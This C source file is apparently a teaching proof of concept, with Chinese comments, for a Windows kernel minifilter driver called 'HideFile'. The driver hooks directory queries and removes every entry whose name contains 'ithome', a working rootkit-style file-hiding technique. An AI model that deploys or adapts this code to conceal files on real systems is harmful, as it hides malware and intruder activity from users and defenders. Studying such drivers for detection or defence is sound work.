#include <fltKernel.h>

#define PROJECT_NAME "HideFile"

PFLT_FILTER gFilterHandle;

NTSTATUS CleanFileIdBothDirectoryInformation(PFILE_ID_BOTH_DIR_INFORMATION info, PFLT_FILE_NAME_INFORMATION fltName)
{
    UNREFERENCED_PARAMETER(fltName);
    PFILE_ID_BOTH_DIR_INFORMATION prevInfo = NULL;
    NTSTATUS status = STATUS_SUCCESS;

    while (TRUE)
    {
        WCHAR buffer[0x101] = {0};
        ULONG length = info->FileNameLength > 0x100 ? 0x100 : info->FileNameLength;
        wcsncpy(buffer, info->FileName, length);

        // 確認是檔案類型，然後比對檔案路徑中有沒有 ithome
        if (!(info->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) && wcsstr(buffer, L"ithome"))
        {
            // 確認要隱藏的 Entry 是不是第一個檔案
            if (prevInfo != NULL)
            {
                // 確認要隱藏的 Entry 是不是最後一個檔案
                if (info->NextEntryOffset != 0)
                {
                    // 如果要隱藏的 Entry 不是第一也不是最後一個檔案，
                    // 則把上一個 Entry 的 Offset 加上要隱藏 Entry 的 Offset 來跳過要隱藏的 Entry
                    prevInfo->NextEntryOffset += info->NextEntryOffset;
                }
                else
                {
                    // 如果要隱藏的 Entry 不是第一個檔案，但是最後一個檔案，
                    // 則把上一個 Entry 的 Offset 改成 0 略過要隱藏的 Entry
                    prevInfo->NextEntryOffset = 0;
                    status = STATUS_SUCCESS;
                    break;
                }

                RtlFillMemory(info, sizeof(FILE_ID_BOTH_DIR_INFORMATION), 0);
            }
            else
            {
                // 確認要隱藏的 Entry 是不是最後一個檔案
                if (info->NextEntryOffset != 0)
                {
                    // 如果要隱藏的 Entry 是第一個檔案，但不是最後一個檔案，
                    // 就把之後的 Entry 所有的資料全都往前複製，把要隱藏的 Entry 蓋掉
                    PFILE_ID_BOTH_DIR_INFORMATION nextInfo =
                        (PFILE_ID_BOTH_DIR_INFORMATION)((PUCHAR)info + info->NextEntryOffset);
                    UINT32 moveLength = 0;
                    while (nextInfo->NextEntryOffset != 0)
                    {
                        moveLength += nextInfo->NextEntryOffset;
                        nextInfo = (PFILE_ID_BOTH_DIR_INFORMATION)((PUCHAR)nextInfo + nextInfo->NextEntryOffset);
                    }

                    moveLength += FIELD_OFFSET(FILE_ID_BOTH_DIR_INFORMATION, FileName) + nextInfo->FileNameLength;
                    RtlMoveMemory(info, (PUCHAR)info + info->NextEntryOffset, moveLength);
                    continue;
                }
                else
                {
                    // 如果要隱藏的 Entry 是第一也是最後一個檔案，就直接當成沒有任何檔案
                    status = STATUS_NO_MORE_ENTRIES;
                    break;
                }
            }
        }

        // 確認還有沒有下一個 Entry，有的話就繼續檢查
        if (info->NextEntryOffset)
        {
            prevInfo = info;
            info = (PFILE_ID_BOTH_DIR_INFORMATION)((PCHAR)info + info->NextEntryOffset);
        }
        else
        {
            break;
        }
    }

    return status;
}

FLT_POSTOP_CALLBACK_STATUS FltDirCtrlPostOperation(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects,
                                                   PVOID CompletionContext, FLT_POST_OPERATION_FLAGS Flags)
{
    UNREFERENCED_PARAMETER(FltObjects);
    UNREFERENCED_PARAMETER(CompletionContext);
    UNREFERENCED_PARAMETER(Flags);

    PFLT_PARAMETERS params = &Data->Iopb->Parameters;
    PFLT_FILE_NAME_INFORMATION fltName;

    if (!NT_SUCCESS(Data->IoStatus.Status))
        return FLT_POSTOP_FINISHED_PROCESSING;

    // 取得 Minifilter Callback 的相關資訊
    NTSTATUS status = FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED, &fltName);
    if (!NT_SUCCESS(status))
    {
        return FLT_POSTOP_FINISHED_PROCESSING;
    }

    // 根據 FileInformationClass 做對應的處理，這個 PoC 只需要看 FileIdBothDirectoryInformation
    switch (params->DirectoryControl.QueryDirectory.FileInformationClass)
    {
        case FileIdBothDirectoryInformation:
            status = CleanFileIdBothDirectoryInformation(
                (PFILE_ID_BOTH_DIR_INFORMATION)params->DirectoryControl.QueryDirectory.DirectoryBuffer, fltName);
            break;
        default:
            status = STATUS_SUCCESS;
    }

    Data->IoStatus.Status = status;
    return FLT_POSTOP_FINISHED_PROCESSING;
}

NTSTATUS HideFileUnload(_In_ FLT_FILTER_UNLOAD_FLAGS Flags)
{
    UNREFERENCED_PARAMETER(Flags);
    PAGED_CODE();
    FltUnregisterFilter(gFilterHandle);
    return STATUS_SUCCESS;
}

NTSTATUS HideFileInstanceSetup(_In_ PCFLT_RELATED_OBJECTS FltObjects, _In_ FLT_INSTANCE_SETUP_FLAGS Flags,
                               _In_ DEVICE_TYPE VolumeDeviceType, _In_ FLT_FILESYSTEM_TYPE VolumeFilesystemType)
{
    UNREFERENCED_PARAMETER(FltObjects);
    UNREFERENCED_PARAMETER(Flags);
    UNREFERENCED_PARAMETER(VolumeDeviceType);
    UNREFERENCED_PARAMETER(VolumeFilesystemType);
    PAGED_CODE();
    return STATUS_SUCCESS;
}

CONST FLT_OPERATION_REGISTRATION Callbacks[] = {{IRP_MJ_DIRECTORY_CONTROL, 0, NULL, FltDirCtrlPostOperation},
                                                {IRP_MJ_OPERATION_END}};

CONST FLT_REGISTRATION FilterRegistration = {
    sizeof(FLT_REGISTRATION),    //  Size
    FLT_REGISTRATION_VERSION,    //  Version
    0,                           //  Flags
    NULL,                        //  Context
    Callbacks,                   //  Operation callbacks
    HideFileUnload,              //  MiniFilterUnload
    HideFileInstanceSetup,       //  InstanceSetup
    NULL,                        //  InstanceQueryTeardown
    NULL,                        //  InstanceTeardownStart
    NULL,                        //  InstanceTeardownComplete
    NULL,                        //  GenerateFileName
    NULL,                        //  GenerateDestinationFileName
    NULL                         //  NormalizeNameComponent
};


extern NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    NTSTATUS status;
    UNREFERENCED_PARAMETER(RegistryPath);

    // 用 FltRegisterFilter 註冊一個 Minifilter 驅動程式
    status = FltRegisterFilter(DriverObject, &FilterRegistration, &gFilterHandle);
    FLT_ASSERT(NT_SUCCESS(status));
    if (NT_SUCCESS(status))
    {
        // 用 FltStartFiltering 啟用功能
        status = FltStartFiltering(gFilterHandle);

        if (!NT_SUCCESS(status))
        {
            FltUnregisterFilter(gFilterHandle);
        }
    }
    return status;
}
